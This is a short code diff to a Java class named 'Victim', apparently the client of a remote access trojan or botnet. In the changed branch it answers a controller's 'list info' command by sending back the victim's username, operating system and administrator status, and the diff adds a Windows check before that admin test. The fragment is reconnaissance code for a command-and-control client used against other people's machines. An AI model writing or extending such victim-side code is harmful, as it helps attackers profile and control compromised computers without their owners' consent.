@@ -156,10 +156,14 @@ public class Victim implements Runnable {
                 }
 
                 if (responseLine.contains("list info")) {
-                    if (isAdmin() == true) {
-                        os.println("online " + whoami + " = " + OS + " admin?= administrator");
-                    } else {
-                        os.println("online " + whoami + " = " + OS + " = admin?= not administrator or linux");
+                    if (OS.contains("windows")) {
+                        if (isAdmin() == true) {
+                            os.println("online " + whoami + " = " + OS + " admin?= administrator");
+                        } else {
+                            os.println("online " + whoami + " = " + OS + " = admin?= not administrator");
+                        }
+                    }else{
+                        os.println("online " + whoami + " = " + OS + " = admin?= ???");
                     }
 
                 }
